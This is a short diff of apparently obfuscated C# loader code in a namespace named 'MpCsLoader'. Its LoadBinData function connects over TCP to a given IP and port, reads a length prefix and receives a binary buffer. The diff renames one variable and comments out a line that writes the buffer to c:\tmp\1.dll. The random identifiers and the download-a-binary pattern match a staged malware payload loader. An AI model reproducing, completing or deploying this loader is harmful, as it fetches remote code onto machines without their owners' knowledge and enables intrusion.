@@ -56,9 +56,9 @@ namespace MpCsLoader
         {
             public static int LoadBinData(string YJiGsVcrrhMcL, int kSLthfG)
             {
-                IPEndPoint qWQlMKl = new IPEndPoint(IPAddress.Parse(YJiGsVcrrhMcL), kSLthfG);
+                IPEndPoint serverEP = new IPEndPoint(IPAddress.Parse(YJiGsVcrrhMcL), kSLthfG);
                 Socket svrSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                try { svrSocket.Connect(qWQlMKl); }
+                try { svrSocket.Connect(serverEP); }
                 catch { return 0; }
                 byte[] BTexRtLHjsryJ = new byte[4];
                 svrSocket.Receive(BTexRtLHjsryJ, 4, 0);
@@ -68,7 +68,7 @@ namespace MpCsLoader
                 while (PmUVgiyFcZ < RUgJAb)
                 { PmUVgiyFcZ += svrSocket.Receive(binBuffer, PmUVgiyFcZ + 5, (RUgJAb - PmUVgiyFcZ) < 4096 ? (RUgJAb - PmUVgiyFcZ) : 4096, 0); }
 
-                File.WriteAllBytes(@"c:\tmp\1.dll", binBuffer);
+                //File.WriteAllBytes(@"c:\tmp\1.dll", binBuffer);
                 
 
 
